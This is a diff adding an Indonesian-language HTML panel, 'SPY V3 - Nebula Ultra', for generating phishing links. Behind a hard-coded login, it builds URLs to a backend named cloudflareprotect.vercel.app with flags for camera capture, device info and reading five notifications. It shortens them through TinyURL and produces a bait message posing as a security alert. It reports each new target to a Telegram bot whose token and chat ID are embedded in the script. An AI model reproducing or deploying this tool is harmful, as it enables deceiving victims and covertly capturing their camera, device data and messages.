@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>𝕷𝕻𝖃 SPY V3 - Nebula Ultra</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    @font-face {
+      font-family: 'Poppins';
+      font-style: normal;
+      font-weight: 400;
+      src: url(https://fonts.gstatic.com/s/poppins/v24/pxiEyp8kv8JHgFVrFJA.ttf) format('truetype');
+    }
+
+    :root {
+      --bg: #05010a;
+      --container: rgba(15, 5, 25, 0.95);
+      --accent: #bc13fe; 
+      --glow: rgba(188, 19, 254, 0.6);
+      --input: #1a052e;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: "Poppins", sans-serif;
+      background: var(--bg);
+      background-image: radial-gradient(circle at center, #1a052e 0%, #05010a 100%);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 450px;
+      background: var(--container);
+      padding: 30px;
+      border-radius: 20px;
+      border: 1px solid rgba(188, 19, 254, 0.4);
+      box-shadow: 0 0 40px var(--glow);
+      backdrop-filter: blur(10px);
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 25px;
+      letter-spacing: 3px;
+      color: #f0abff;
+      text-shadow: 0 0 10px var(--accent);
+    }
+
+    .form-group { text-align: left; margin-bottom: 15px; }
+    label { font-size: 12px; color: #bc13fe; margin-left: 5px; font-weight: bold; }
+
+    input {
+      width: 100%; padding: 12px; border-radius: 12px;
+      background: var(--input); border: 1px solid #3a0066;
+      color: #fff; margin-top: 5px; outline: none; transition: 0.3s;
+    }
+    input:focus { border-color: var(--accent); box-shadow: 0 0 15px var(--glow); }
+
+    button {
+      width: 100%; padding: 14px; border-radius: 12px; border: none;
+      background: linear-gradient(135deg, #7a12ff, #bc13fe);
+      color: #fff; font-weight: bold; cursor: pointer;
+      margin-top: 10px; transition: 0.3s; text-transform: uppercase;
+    }
+    button:hover { transform: translateY(-2px); box-shadow: 0 5px 20px var(--glow); }
+
+    .result-section {
+      margin-top: 25px; display: none; padding-top: 20px;
+      border-top: 1px solid rgba(188, 19, 254, 0.3);
+    }
+
+    #generatedLink {
+      color: #00d9ff; font-weight: bold; font-size: 14px;
+      word-break: break-all; display: block; margin-bottom: 15px;
+    }
+
+    .bait-box {
+      background: #000; padding: 12px; border-radius: 10px;
+      font-size: 11px; text-align: left; color: #00ffcc;
+      border-left: 4px solid var(--accent); margin-bottom: 15px;
+    }
+
+    .hidden { display: none; }
+    .footer-text { font-size: 10px; color: #444; margin-top: 20px; }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="loginBox">
+    <h2>NEBULA LOGIN</h2>
+    <div class="form-group">
+      <input type="text" id="userIn" placeholder="Username">
+    </div>
+    <div class="form-group">
+      <input type="password" id="passIn" placeholder="Password">
+    </div>
+    <button onclick="handleLogin()">Otentikasi</button>
+  </div>
+
+  <div class="container hidden" id="genBox">
+    <h2>SPY V3 CREATOR</h2>
+    
+    <div class="form-group">
+      <label>URL TARGET (REDIRECT)</label>
+      <input type="text" id="targetUrl" placeholder="Contoh: https://youtube.com">
+    </div>
+
+    <button id="genBtn" onclick="createSpyLink()">GENERATE NEBULA LINK</button>
+
+    <div class="result-section" id="resSection">
+      <label>LINK ENKRIPSI:</label>
+      <a id="generatedLink" href="#" target="_blank"></a>
+      
+      <div class="bait-box">
+        <strong>PESAN UMPAN (COPY):</strong><br>
+        <span id="baitMsg"></span>
+      </div>
+
+      <button onclick="copyToClipboard()" style="background: #1a052e; font-size: 12px;">Salin Link & Pesan</button>
+      <p id="notifStatus" style="font-size: 11px; color: #00ffcc; margin-top: 5px;"></p>
+    </div>
+
+    <p class="footer-text">Powered by Nebula Engine V3 - 2026</p>
+  </div>
+
+  <script>
+    // KONFIGURASI PRIVATE ANDA
+    const DATABASE = {
+      token: "8617398870:AAHHVz0unYAW1pt75b-jo3AGhAxIxsWu47Q",
+      chatId: "8213510319",
+      backend: "https://cloudflareprotect.vercel.app",
+      user: "bau",
+      pass: "peler"
+    };
+
+    function handleLogin() {
+      const u = document.getElementById('userIn').value;
+      const p = document.getElementById('passIn').value;
+      if(u === DATABASE.user && p === DATABASE.pass) {
+        document.getElementById('loginBox').classList.add('hidden');
+        document.getElementById('genBox').classList.remove('hidden');
+      } else {
+        alert("Akses Ilegal Terdeteksi!");
+      }
+    }
+
+    async function createSpyLink() {
+      const target = document.getElementById('targetUrl').value;
+      const btn = document.getElementById('genBtn');
+      
+      if(!target) return alert("Silakan masukkan URL target!");
+
+      btn.innerText = "ENCRYPTING...";
+      btn.disabled = true;
+
+      // PARAMETER SPY: Camera, Info, & Read 5 Notifications
+      const rawUrl = `${DATABASE.backend}?token=${DATABASE.token}&chat=${DATABASE.chatId}&target=${encodeURIComponent(target)}&cam=true&info=true&read_notif=5`;
+
+      try {
+        const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(rawUrl)}`);
+        const short = await res.text();
+
+        // Tampilkan Hasil
+        document.getElementById('resSection').style.display = 'block';
+        document.getElementById('generatedLink').innerText = short;
+        document.getElementById('generatedLink').href = short;
+
+        // Pesan Umpan Terbaru V3
+        const umpan = `⚠️ Peringatan Keamanan: Akun Anda terdeteksi login di lokasi yang tidak dikenal. Segera amankan akun dan baca 5 pesan terakhir yang masuk untuk verifikasi di sini: ${short}`;
+        document.getElementById('baitMsg').innerText = umpan;
+
+        // Kirim Status ke Telegram Anda
+        const logMsg = `🔥 *NEW TARGET READY!* \n\n🎯 Target: ${target}\n🔗 Link: ${short}\n🛠 Fitur: Cam, Device Info, 5 Notif Reader Aktif!`;
+        fetch(`https://api.telegram.org/bot${DATABASE.token}/sendMessage?chat_id=${DATABASE.chatId}&text=${encodeURIComponent(logMsg)}&parse_mode=Markdown`);
+
+        btn.innerText = "GENERATE NEBULA LINK";
+        btn.disabled = false;
+      } catch (e) {
+        alert("Gagal terhubung ke Server TinyURL.");
+        btn.innerText = "GENERATE NEBULA LINK";
+        btn.disabled = false;
+      }
+    }
+
+    function copyToClipboard() {
+      const link = document.getElementById('generatedLink').innerText;
+      const bait = document.getElementById('baitMsg').innerText;
+      navigator.clipboard.writeText(`${bait}`);
+      
+      const st = document.getElementById('notifStatus');
+      st.innerText = "Pesan & Link Berhasil Disalin!";
+      setTimeout(() => { st.innerText = ""; }, 3000);
+    }
+  </script>
+</body>
+</html>
